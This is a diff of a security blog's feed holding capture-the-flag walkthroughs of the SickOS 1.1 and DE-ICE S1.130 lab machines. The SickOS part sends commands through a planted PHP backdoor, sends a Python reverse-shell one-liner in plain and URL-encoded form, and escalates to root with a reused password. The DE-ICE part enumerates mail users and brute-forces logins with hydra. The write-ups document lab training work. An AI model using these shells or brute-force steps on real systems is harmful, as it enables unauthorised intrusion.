+<p>It does not work, the server is still asking password, even when we try to set more restricted permission:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ ssh -i blabla 192.168.80.169 -l www-data
+</span><span class='line'>www-data@192.168.80.169's password:
+</span><span class='line'>
+</span><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=chmod+600+~www-data/.ssh/authorized_keys"
+</span><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=chmod+700+~www-data/.ssh"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We come back to this later. Trying different payload, we encode the following
+command and invoke via our backdoor, the second output is ascii encoded using
+Burp Encoder:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&quot;import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(&#39;/bin/bash&#39;)&quot;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">80.137</span> <span class="mi">1400</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>%70%79%74%68%6f%6e%20%2d%63%20%22%69%6d%70%6f%72%74%20%73%79%73%2c%73%6f%63%6b%65%74%2c%6f%73%2c%70%74%79%3b%20%5f%2c%69%70%2c%70%6f%72%74%3d%73%79%73%2e%61%72%67%76%3b%20%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%20%73%2e%63%6f%6e%6e%65%63%74%28%28%69%70%2c%69%6e%74%28%70%6f%72%74%29%29%29%3b%20%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%64%29%20%66%6f%72%20%66%64%20%69%6e%20%28%30%2c%31%2c%32%29%5d%3b%20%70%74%79%2e%73%70%61%77%6e%28%27%2f%62%69%6e%2f%62%61%73%68%27%29%22%20%31%39%32%2e%31%36%38%2e%38%30%2e%31%33%37%20%31%34%30%30</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is how we got the remote shell:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ nc -l -p 1400
+</span><span class='line'>
+</span><span class='line'>root@kali32:~$ curl --proxy 192.168.80.169:3128 "http://192.168.80.169/wolfcms/public/a.php?cmd=%70%79%74%68%6f%6e%20%2d%63%20%22%69%6d%70%6f%72%74%20%73%79%73%2c%73%6f%63%6b%65%74%2c%6f%73%2c%70%74%79%3b%20%5f%2c%69%70%2c%70%6f%72%74%3d%73%79%73%2e%61%72%67%76%3b%20%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%20%73%2e%63%6f%6e%6e%65%63%74%28%28%69%70%2c%69%6e%74%28%70%6f%72%74%29%29%29%3b%20%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%64%29%20%66%6f%72%20%66%64%20%69%6e%20%28%30%2c%31%2c%32%29%5d%3b%20%70%74%79%2e%73%70%61%77%6e%28%27%2f%62%69%6e%2f%62%61%73%68%27%29%22%20%31%39%32%2e%31%36%38%2e%38%30%2e%31%33%37%20%31%34%30%30"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We connect to MySQL again, this time we noticed that there is user <code>sickos</code> with the same password as mysql <code>root</code>, that is <code>john@123</code>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@SickOs:/etc/mysql$ mysql -uroot -pjohn@123 mysql
+</span><span class='line'>mysql -uroot -pjohn@123 mysql
+</span><span class='line'>Reading table information for completion of table and column names
+</span><span class='line'>You can turn off this feature to get a quicker startup with -A
+</span><span class='line'>
+</span><span class='line'>Welcome to the MySQL monitor.  Commands end with ; or \g.
+</span><span class='line'>Your MySQL connection id is 165
+</span><span class='line'>Server version: 5.5.46-0ubuntu0.12.04.2 (Ubuntu)
+</span><span class='line'>
+</span><span class='line'>Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.
+</span><span class='line'>
+</span><span class='line'>Oracle is a registered trademark of Oracle Corporation and/or its
+</span><span class='line'>affiliates. Other names may be trademarks of their respective
+</span><span class='line'>owners.
+</span><span class='line'>
+</span><span class='line'>Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+</span><span class='line'>
+</span><span class='line'>mysql> SELECT User,Host,Password FROM mysql.user;
+</span><span class='line'>SELECT User,Host,Password FROM mysql.user;
+</span><span class='line'>+------------------+-----------+-------------------------------------------+
+</span><span class='line'>| User             | Host      | Password                                  |
+</span><span class='line'>+------------------+-----------+-------------------------------------------+
+</span><span class='line'>| root             | localhost | *A7A20B93EC076311A63BF86B5C705B25C054DD77 |
+</span><span class='line'>| root             | sickos    | *A7A20B93EC076311A63BF86B5C705B25C054DD77 |
+</span><span class='line'>| root             | 127.0.0.1 | *A7A20B93EC076311A63BF86B5C705B25C054DD77 |
+</span><span class='line'>| root             | ::1       | *A7A20B93EC076311A63BF86B5C705B25C054DD77 |
+</span><span class='line'>| debian-sys-maint | localhost | *CB98094782C386F2459D65D97B17D1DE15D1654B |
+</span><span class='line'>+------------------+-----------+-------------------------------------------+
+</span><span class='line'>5 rows in set (0.00 sec)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>His shell uses the same password and we can easily escalate to uid 0.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@SickOs:/var/www/wolfcms/public$ su sickos
+</span><span class='line'>su sickos
+</span><span class='line'>Password: john@123
+</span><span class='line'>
+</span><span class='line'>sickos@SickOs:/var/www/wolfcms/public$
+</span><span class='line'>
+</span><span class='line'>sickos@SickOs:/var/www/wolfcms/public$ sudo -l
+</span><span class='line'>sudo -l
+</span><span class='line'>[sudo] password for sickos: john@123
+</span><span class='line'>
+</span><span class='line'>Matching Defaults entries for sickos on this host:
+</span><span class='line'>    env_reset,
+</span><span class='line'>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+</span><span class='line'>
+</span><span class='line'>User sickos may run the following commands on this host:
+</span><span class='line'>    (ALL : ALL) ALL
+</span><span class='line'>sickos@SickOs:/var/www/wolfcms/public$ sudo su
+</span><span class='line'>sudo su
+</span><span class='line'>
+</span><span class='line'>root@SickOs:/var/www/wolfcms/public# cd /root
+</span><span class='line'>cd /root
+</span><span class='line'>root@SickOs:~# ls -la
+</span><span class='line'>ls -la
+</span><span class='line'>total 40
+</span><span class='line'>drwx------  3 root root 4096 Dec  6 21:14 .
+</span><span class='line'>drwxr-xr-x 22 root root 4096 Sep 22 08:13 ..
+</span><span class='line'>-rw-r--r--  1 root root   96 Dec  6 07:27 a0216ea4d51874464078c618298b1367.txt
+</span><span class='line'>-rw-------  1 root root 3724 Dec  6 21:18 .bash_history
+</span><span class='line'>-rw-r--r--  1 root root 3106 Apr 19  2012 .bashrc
+</span><span class='line'>drwx------  2 root root 4096 Sep 22 08:33 .cache
+</span><span class='line'>-rw-------  1 root root   22 Dec  5 06:24 .mysql_history
+</span><span class='line'>-rw-r--r--  1 root root  140 Apr 19  2012 .profile
+</span><span class='line'>-rw-------  1 root root 5230 Dec  6 21:14 .viminfo
+</span><span class='line'>root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt
+</span><span class='line'>cat a0216ea4d51874464078c618298b1367.txt
+</span><span class='line'>If you are viewing this!!
+</span><span class='line'>
+</span><span class='line'>ROOT!
+</span><span class='line'>
+</span><span class='line'>You have Succesfully completed SickOS1.1.
+</span><span class='line'>Thanks for Trying</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Reading the <code>auth.log</code>, we also found out the reason why ssh did not worked:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Dec 12 15:36:27 SickOs sshd[3533]: Authentication refused: bad ownership or modes for directory /var/www</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Unfortunately our user could not change this permission.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Kioptrix: Level 4]]></title>
@@ -16182,856 +16904,6 @@ predictable for dirb.</p>
 </span><span class='line'>startx
 </span><span class='line'>nano .bash_history 
 </span><span class='line'>exit</span></code></pre></td></tr></table></div></figure>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[DE-ICE-S1.130]]></title>
-    <link href="http://73696e65.github.io/blog/2015/05/14/de-ice-s1-dot-130/"/>
-    <updated>2015-05-14T15:34:52+02:00</updated>
-    <id>http://73696e65.github.io/blog/2015/05/14/de-ice-s1-dot-130</id>
-    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/de-ice-s1130,11/">De-ICE: S1.130</a></p>
-
-<p>Nmap output:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>PORT    STATE  SERVICE  VERSION
-</span><span class='line'>20/tcp  closed ftp-data
-</span><span class='line'>21/tcp  open   ftp      vsftpd 2.0.4
-</span><span class='line'>22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
-</span><span class='line'>25/tcp  open   smtp     Sendmail 8.13.7/8.13.7
-</span><span class='line'>80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
-</span><span class='line'>110/tcp open   pop3     Openwall popa3d
-</span><span class='line'>143/tcp open   imap     UW imapd 2004.357
-</span><span class='line'>443/tcp closed https
-</span><span class='line'>MAC Address: 00:0C:29:53:2F:A3 (VMware)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Dirb output:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>---- Scanning URL: http://192.168.1.20/ ----
-</span><span class='line'>+ http://192.168.1.20/cgi-bin/ (CODE:403|SIZE:296)
-</span><span class='line'>+ http://192.168.1.20/index.php (CODE:200|SIZE:1980)
-</span><span class='line'>+ http://192.168.1.20/index2.php (CODE:200|SIZE:563)
-</span><span class='line'>+ http://192.168.1.20/info.php (CODE:200|SIZE:37915)
-</span><span class='line'>+ http://192.168.1.20/~sysadmin (CODE:403|SIZE:416)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>There is nothing interesting for us except the sysadmin account.</p>
-
-<p>Web page mentions <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#111;&#x3a;&#x63;&#117;&#x73;&#116;&#x6f;&#x6d;&#101;&#114;&#115;&#101;&#114;&#x76;&#x69;&#99;&#x65;&#x61;&#x64;&#x6d;&#105;&#x6e;&#x40;&#x6e;&#x6f;&#x73;&#101;&#99;&#x62;&#x61;&#x6e;&#x6b;&#46;&#99;&#x6f;&#x6d;">&#x63;&#x75;&#x73;&#x74;&#x6f;&#x6d;&#x65;&#x72;&#x73;&#101;&#x72;&#118;&#x69;&#x63;&#x65;&#x61;&#100;&#x6d;&#105;&#x6e;&#64;&#x6e;&#x6f;&#115;&#101;&#x63;&#x62;&#97;&#x6e;&#x6b;&#x2e;&#99;&#111;&#109;</a> email address. After a
-little trying, we found out the user account that exists:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# smtp-user-enum -M RCPT -t 192.168.1.20 -f root@slax.example.net -U -
-</span><span class='line'>csadmin
-</span><span class='line'>[CTRL+D]
-</span><span class='line'>
-</span><span class='line'>Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
-</span><span class='line'>
-</span><span class='line'> ----------------------------------------------------------
-</span><span class='line'>|                   Scan Information                       |
-</span><span class='line'> ----------------------------------------------------------
-</span><span class='line'>
-</span><span class='line'>Mode ..................... RCPT
-</span><span class='line'>Worker Processes ......... 5
-</span><span class='line'>Usernames file ........... -
-</span><span class='line'>Target count ............. 1
-</span><span class='line'>Username count ........... 1
-</span><span class='line'>Target TCP port .......... 25
-</span><span class='line'>Query timeout ............ 5 secs
-</span><span class='line'>Target domain ............
-</span><span class='line'>
-</span><span class='line'>######## Scan started at Thu May  7 13:50:31 2015 #########
-</span><span class='line'>192.168.1.20: csadmin exists
-</span><span class='line'>######## Scan completed at Thu May  7 13:50:31 2015 #########
-</span><span class='line'>1 results.
-</span><span class='line'>
-</span><span class='line'>1 queries in 2 seconds (0.5 queries / sec)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We use hydra to crack user account successfully (ftp was the fastest way):</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# hydra -l csadmin 192.168.1.20 ftp -P /usr/share/ncrack/top50000.pwd -V
-</span><span class='line'>[21][ftp] host: 192.168.1.20   login: csadmin   password: rocker
-</span><span class='line'>
-</span><span class='line'>root@kali32:~# hydra -l csadmin 192.168.1.20 imap -P /usr/share/ncrack/top50000.pwd -V
-</span><span class='line'>[143][imap] host: 192.168.1.20   login: csadmin   password: rocker
-</span><span class='line'>
-</span><span class='line'>root@kali32:~# hydra -l csadmin 192.168.1.20 ssh -P /usr/share/ncrack/top50000.pwd -V -t 4
-</span><span class='line'>[22][ssh] host: 192.168.1.20   login: csadmin   password: rocker
-</span><span class='line'>
-</span><span class='line'>root@kali32:~# hydra -l csadmin 192.168.1.20 pop3 -P /usr/share/ncrack/top50000.pwd -V
-</span><span class='line'>[110][pop3] host: 192.168.1.20   login: csadmin   password: rocker</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We log in as csadmin / rocker:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>csadmin@slax:~$ cat /etc/passwd
-</span><span class='line'>root:x:0:0::/root:/bin/bash
-</span><span class='line'>bin:x:1:1:bin:/bin:
-</span><span class='line'>daemon:x:2:2:daemon:/sbin:
-</span><span class='line'>adm:x:3:4:adm:/var/log:
-</span><span class='line'>lp:x:4:7:lp:/var/spool/lpd:
-</span><span class='line'>sync:x:5:0:sync:/sbin:/bin/sync
-</span><span class='line'>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
-</span><span class='line'>halt:x:7:0:halt:/sbin:/sbin/halt
-</span><span class='line'>mail:x:8:12:mail:/:
-</span><span class='line'>news:x:9:13:news:/usr/lib/news:
-</span><span class='line'>uucp:x:10:14:uucp:/var/spool/uucppublic:
-</span><span class='line'>operator:x:11:0:operator:/root:/bin/bash
-</span><span class='line'>games:x:12:100:games:/usr/games:
-</span><span class='line'>ftp:x:14:50::/home/ftp:
-</span><span class='line'>smmsp:x:25:25:smmsp:/var/spool/clientmqueue:
-</span><span class='line'>mysql:x:27:27:MySQL:/var/lib/mysql:/bin/bash
-</span><span class='line'>rpc:x:32:32:RPC portmap user:/:/bin/false
-</span><span class='line'>sshd:x:33:33:sshd:/:
-</span><span class='line'>gdm:x:42:42:GDM:/var/state/gdm:/bin/bash
-</span><span class='line'>pop:x:90:90:POP:/:
-</span><span class='line'>nobody:x:99:99:nobody:/:
-</span><span class='line'>sysadmin:x:1000:10:,,,:/home/sysadmin:/bin/bash
-</span><span class='line'>dbadmin:x:1001:100:,,,:/home/dbadmin:/bin/bash
-</span><span class='line'>sdadmin:x:1002:100:,,,:/home/sdadmin:/bin/bash
-</span><span class='line'>csadmin:x:1003:100:,,,:/home/csadmin:/bin/bash</span></code></pre></td></tr></table></div></figure>
-
-
-<p>In home directory, there is a clue how to get sdadmin&rsquo;s password:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>csadmin@slax:~$ cat mailserv_download/2010122014234.j12Gqo4H049241 
-</span><span class='line'>To: csadmin@nosecbank.com
-</span><span class='line'>CC: 
-</span><span class='line'>Subject: My Son's Birthday
-</span><span class='line'>Date: Mon, 20 Dec 2010 14:23:46 +0500
-</span><span class='line'>Return-Path: &lt;sdadmin@nosecbank.com>
-</span><span class='line'>Delivered-To: csadmin:nosecbank.com@nosecbank.com
-</span><span class='line'>Received: (qmail 20281 invoked from network); 20 Dec 2010 09:23:46 -0000
-</span><span class='line'>X-Received: from network (192.168.1.123) by mailserv1-3.us6.service.com; 
-</span><span class='line'>20 Dec 2010 09:23:46 -0000
-</span><span class='line'>Received: from www.nosecbank.com (unknown [198.65.139.34]) by 
-</span><span class='line'>srv5.us6.service.com (Postfix) with ESMTP id D98402459DD for 
-</span><span class='line'>&lt;csadmin@nosecbank.com>; Mon, 20 Dec 2010 09:23:46 +0000 (GMT)
-</span><span class='line'>Message-Id: &lt;2010122014234.j12Gqo4H049241@www.nosecbank.com>
-</span><span class='line'>Mime-Version: 1.0
-</span><span class='line'>Content-Type: multipart/alternative; 
-</span><span class='line'>boundary="---=_NextPart_000_0000_02F24S11.FEPQRE80"
-</span><span class='line'>X-Mailer: K-Mail; Build 1.0.5510
-</span><span class='line'>Thread-Index: Qw2cWVmE3odZs3TqTTqFvS1e3lexms==
-</span><span class='line'>Message: Hey Mark, I am curious if you would be free to come over and 
-</span><span class='line'>visit for my son Donovin's birthday tomorrow after work.  I would also 
-</span><span class='line'>appreciate if you brought Andy with you as well, because Donny 
-</span><span class='line'>really enjoyed playing with him last time he was over.  I know its short 
-</span><span class='line'>notice but he is turning 12 and it is special for both him and me. Let 
-</span><span class='line'>me know if this works. Thanks!  -Paul</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Also there is a secord part of some algorithm:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">csadmin</span><span class="err">@</span><span class="nl">slax</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">strings</span> <span class="n">mailserv_download</span><span class="o">/</span><span class="mf">2010122216451.f</span><span class="mi">81L</span><span class="n">tw4R010211</span><span class="p">.</span><span class="n">part2</span> <span class="o">|</span> <span class="n">egrep</span> <span class="o">-</span><span class="n">o</span> <span class="s">&quot;([0-9][0-9].*)&quot;</span>
-</span><span class='line'><span class="mi">24</span>      <span class="kt">int</span><span class="p">[]</span> <span class="n">backLoop</span><span class="p">(</span><span class="kt">int</span><span class="p">[]</span> <span class="n">input</span><span class="p">){</span>
-</span><span class='line'><span class="mi">25</span>      <span class="kt">int</span> <span class="n">ref</span><span class="o">=</span><span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="p">;</span>   <span class="n">w</span>
-</span><span class='line'><span class="mi">26</span>      <span class="kt">int</span> <span class="n">a</span><span class="o">=</span><span class="n">input</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> <span class="kt">int</span> <span class="n">b</span><span class="o">=</span><span class="n">input</span><span class="p">[</span><span class="n">ref</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span>
-</span><span class='line'><span class="mi">27</span>      <span class="kt">int</span> <span class="n">ch</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">;</span>
-</span><span class='line'><span class="mi">28</span>      <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">ref</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
-</span><span class='line'><span class="mi">29</span>      <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span> <span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="p">(</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">%</span><span class="n">check</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="n">ref</span><span class="o">+</span><span class="n">i</span><span class="p">);</span>
-</span><span class='line'><span class="mi">30</span>      <span class="k">else</span> <span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="p">(</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+</span><span class="n">ref</span><span class="o">+</span><span class="n">i</span><span class="p">);}</span>        <span class="p">.</span>
-</span><span class='line'><span class="mi">31</span>      <span class="k">return</span> <span class="n">input</span><span class="p">;}</span>
-</span><span class='line'><span class="mi">45</span>      <span class="kt">int</span><span class="p">[]</span> <span class="n">loopProcess</span><span class="p">(</span><span class="kt">int</span><span class="p">[]</span> <span class="n">input</span><span class="p">){</span>
-</span><span class='line'><span class="mi">46</span>      <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
-</span><span class='line'><span class="mi">47</span>      <span class="k">if</span><span class="p">(</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">==</span><span class="mi">40</span><span class="o">||</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">==</span><span class="mi">41</span><span class="p">)</span> <span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+=</span><span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="p">;</span>
-</span><span class='line'><span class="mi">48</span>      <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">==</span><span class="mi">45</span><span class="p">)</span> <span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+=</span><span class="mi">20</span><span class="o">+</span><span class="n">i</span><span class="p">;}</span>
-</span><span class='line'><span class="mi">49</span>      <span class="k">return</span> <span class="n">input</span><span class="p">;}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Using this information, we was able to crack the password:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# for i in {1..2000}; do echo donovin$i; echo Donovin$i; echo "$i"donovin; echo "$i"Donovin; done > wl
-</span><span class='line'>root@kali32:~# hydra -l sdadmin 192.168.1.20 ftp -P wl 
-</span><span class='line'>Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
-</span><span class='line'>
-</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) starting at 2015-05-08 06:12:57
-</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 64 tasks, 8000 login tries (l:1/p:8000), ~7 tries per task
-</span><span class='line'>[DATA] attacking service ftp on port 21
